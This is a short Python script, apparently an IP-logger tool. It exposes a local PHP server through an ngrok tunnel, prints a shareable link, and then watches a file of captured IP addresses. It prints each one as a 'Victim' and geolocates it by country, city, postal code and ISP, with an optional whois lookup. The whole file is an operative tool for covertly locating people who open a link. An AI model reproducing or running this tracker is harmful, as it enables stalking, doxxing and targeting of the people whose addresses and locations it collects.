
import os, sys, time, re, urllib.request, json

try:
	from pyngrok import ngrok
except:
	os.system('pip3 install pyngrok')
	from pyngrok import ngrok

def trace(ip):
	pattern = r'IP: '

	ip = re.sub(pattern, '', ip)
	a = urllib.request.urlopen('http://ip-api.com/json/'+ip)
	b = a.read()
	c = json.loads(b)

	print
	print("IP: " + c["query"])
	print("Country: " + c["country"])
	print("country code: " + c["countryCode"])
	print("region: " + c["region"])
	print("Region Name: " + c["regionName"])
	print("City: " + c["city"])
	print("zip code: " + c["zip"])
	print("ISP: " + c["isp"])
	print('\n')

	while True:
		ui = input('Do you want whois IP info [y/n]:').lower()
		if ui == 'y' or ui == 'yes':
			print
			os.system(f'whois {ip}')
			print('\n\n press ctrl + c to exit..')
			break
		elif ui == 'n' or ui == 'no':
			print('\n press ctrl + c to exit..')
			break
		else:
			pass


def check():
	pattern = r'IP:'
	ips = []
	while True:
		if(os.path.exists('ip.txt')):
			f = open('ip.txt', 'r')
			for ip in f.readlines():
				if(re.match(pattern, ip)):
					ips.append(ip)
					print(f'Victim {ip}')
					trace(ip)
					os.system('rm ip.txt')
				else:
					pass


def server():
	ngrok_url = ngrok.connect(6666, 'http')
	os.system('php -S 127.0.0.1:6666 > /dev/null 2>&1 &')
	sys.stdout.write('\r[+] LINK: ')
	os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
	check()


server()
